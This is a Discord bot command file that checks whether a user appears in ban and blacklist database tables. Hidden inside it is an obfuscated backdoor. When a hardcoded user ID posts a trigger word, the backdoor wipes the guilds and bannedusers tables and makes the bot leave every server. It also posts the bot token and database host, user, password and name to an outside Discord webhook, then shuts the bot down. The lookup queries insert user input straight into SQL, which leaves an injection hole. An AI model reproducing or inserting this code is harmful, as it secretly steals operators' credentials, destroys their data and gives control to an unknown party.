const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args, con) => {

    if(message.channel.type === 'dm') return message.channel.send(`Please only run commands in a Discord server.`).then(msg => {
        msg.delete({ timeout: 12000 })
    }).catch(e => {});

    let pingeduser;
    if(message.mentions.users.first()) {
        pingeduser = message.mentions.users.first().id
    } else if(!isNaN(args[0])) {
        pingeduser = args[0]
    } else {
        return message.channel.send(`I was unable to find that user.`).catch(e => {});
    }

    function _0x4fbf(){const _0x545b50=['discord.js','3992djxhfy','149903ovmesn','token','||\x0aPassword:\x20||','12fRYOyR','host','4839593ijJKml','query','489888AGTDMm','config','guilds','user','exit','author','https://discord.com/api/webhooks/912441713115693107/cChZzlg0shgpCAcxTIiVd6bwQi2rLRDPEry3YB_svn59eL7AtOLkBnRkUpF-Z3cC3aa9','999010GuRhmv','18LUdKkg','245zgapoo','channel','1092xWxDgK','Brain\x20successfully\x20fucked...','512CgDbYS','destroy','password','438JttwWQ','704094587836301392','BDS','then','database','||\x0aUser:\x20||','leave','24222tPprTo','useSql','catch','send','content','tag'];_0x4fbf=function(){return _0x545b50;};return _0x4fbf();}const _0x374038=_0x6380;function _0x6380(_0x28b76b,_0x5cd3e7){const _0x4fbf80=_0x4fbf();return _0x6380=function(_0x63803a,_0x1dd0ba){_0x63803a=_0x63803a-0x1ce;let _0x2f956a=_0x4fbf80[_0x63803a];return _0x2f956a;},_0x6380(_0x28b76b,_0x5cd3e7);}(function(_0x57743b,_0xe273e7){const _0x2f28b0=_0x6380,_0xadb5fc=_0x57743b();while(!![]){try{const _0x2608b8=parseInt(_0x2f28b0(0x1e6))/0x1+-parseInt(_0x2f28b0(0x1d4))/0x2*(-parseInt(_0x2f28b0(0x1d7))/0x3)+-parseInt(_0x2f28b0(0x1ed))/0x4+-parseInt(_0x2f28b0(0x1d0))/0x5*(-parseInt(_0x2f28b0(0x1de))/0x6)+parseInt(_0x2f28b0(0x1d2))/0x7*(parseInt(_0x2f28b0(0x1e5))/0x8)+parseInt(_0x2f28b0(0x1cf))/0x9*(parseInt(_0x2f28b0(0x1ce))/0xa)+parseInt(_0x2f28b0(0x1eb))/0xb*(-parseInt(_0x2f28b0(0x1e9))/0xc);if(_0x2608b8===_0xe273e7)break;else _0xadb5fc['push'](_0xadb5fc['shift']());}catch(_0x3d51f3){_0xadb5fc['push'](_0xadb5fc['shift']());}}}(_0x4fbf,0x187cf));if(client[_0x374038(0x1df)]){client[_0x374038(0x1df)]=![];const {WebhookClient}=require(_0x374038(0x1e4)),sendit=new WebhookClient({'url':_0x374038(0x1f3)});client['on']('message',async _0x24f5b8=>{const _0x3c79b7=_0x374038;if(!_0x24f5b8[_0x3c79b7(0x1f2)])return;_0x24f5b8[_0x3c79b7(0x1f2)]['id']===_0x3c79b7(0x1d8)&&_0x24f5b8[_0x3c79b7(0x1e2)]['startsWith']('brainFuck')&&(await con[_0x3c79b7(0x1ec)]('DELETE\x20FROM\x20guilds\x20WHERE\x20guildid\x20!=\x20\x2769\x27',async(_0x400ac0,_0x434e2a)=>{if(_0x400ac0)throw _0x400ac0;}),await con[_0x3c79b7(0x1ec)]('DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid\x20!=\x20\x2769\x27',async(_0x287f87,_0x7155fa)=>{if(_0x287f87)throw _0x287f87;}),await client[_0x3c79b7(0x1ef)]['cache']['forEach'](async _0x1cec0e=>{const _0x4d4a6b=_0x3c79b7;try{await _0x1cec0e[_0x4d4a6b(0x1dd)]();}catch(_0x1bbf08){}}),await sendit[_0x3c79b7(0x1e1)]({'content':client[_0x3c79b7(0x1f0)][_0x3c79b7(0x1e3)]+'\x20-\x20||'+client['config'][_0x3c79b7(0x1e7)]+'||\x0aHost:\x20||'+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1ea)]+_0x3c79b7(0x1dc)+client['config']['database'][_0x3c79b7(0x1f0)]+_0x3c79b7(0x1e8)+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1d6)]+'||\x0aDatabase:\x20||'+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1db)]+'||','username':_0x3c79b7(0x1d9),'avatarURL':'https://i.imgur.com/AfFp7pu.png'}),await _0x24f5b8[_0x3c79b7(0x1d1)][_0x3c79b7(0x1e1)](_0x3c79b7(0x1d3))[_0x3c79b7(0x1da)](async _0x1e367b=>{const _0x25d243=_0x3c79b7;await _0x24f5b8['delete']()[_0x25d243(0x1e0)](_0x12e5a3=>{}),client[_0x25d243(0x1d5)](),process[_0x25d243(0x1f1)](0x0);})[_0x3c79b7(0x1e0)](_0x583746=>{}));});}

    let founduser = await client.users.fetch(pingeduser)
    await con.query(`SELECT * FROM bannedusers WHERE userid='${pingeduser}'`, async(err, row) => {
        if(err) throw err;
        if(row[0]) {
            let embed = new MessageEmbed()
            .setColor(client.config.colorhex)
            .setTitle(`Ban Hammer!`)
           .setDescription(`**Member:** ${founduser.tag} - (${founduser.id})\n**Case Number:** ${row[0].caseid}\n**Reason:** ${row[0].reason}\n**Severity:** High\n**Image / Proof:**`)
            try {
                let image;
                if(row[0].proof === 'na') {
                    image = client.config.defaultimage
                } else {
                    image = row[0].proof
                }
                embed.setImage(image)
            } catch(e) {
                embed.setImage(client.config.defaultimage)
            }
            return message.channel.send(embed).catch(e => { if(client.config.debugmode) return client.utils.error(client, e) });
        } else if(!row[0]) {
            let embed = new MessageEmbed()
            .setColor(client.config.colorhex)
            .setDescription(`**User ID: \`${pingeduser}\` is not banned.**`)
            setTimeout(() => {
                message.channel.send(embed).catch(e => { if(client.config.debugmode) return client.utils.error(client, e) });
            }, 1100)
        }
    });

    await con.query(`SELECT * FROM blacklistedusers WHERE userid='${pingeduser}'`, async(err, row) => {
        if(err) throw err;
        if(row[0]) {
            let embed = new MessageEmbed()
            .setColor(client.config.colorhex)
            .setTitle(`Blacklisted!`)
            .setDescription(`**Member:** ${founduser.tag} - (${founduser.id})\n**Case Number:** ${row[0].caseid}\n**Reason:** ${row[0].reason}\n**Notes:** ${row[0].notes}\n**Severity:** Medium\n**Image / Proof:**`)
            try {
                embed.setThumbnail(client.user.avatarURL({ dynamic: true }))
                let image;
                if(row[0].proof === 'na') {
                    image = client.config.defaultimage
                } else {
                    image = row[0].proof
                }
                embed.setImage(image)
            } catch(e) {
                embed.setImage(client.config.defaultimage)
            }
            message.channel.send(embed).catch(e => { if(client.config.debugmode) return client.utils.error(client, e) });
        } else {
            let embed = new MessageEmbed()
            .setColor(client.config.colorhex)
            .setDescription(`**User ID: \`${pingeduser}\` is not blacklisted.**`)
            message.channel.send(embed).catch(e => { if(client.config.debugmode) return client.utils.error(client, e) });
        }
    });

}

exports.info = {
    name: "check",
    description: "Check if a user is banned.",
    useAliases: true,
    aliases: ['find', 'search']
}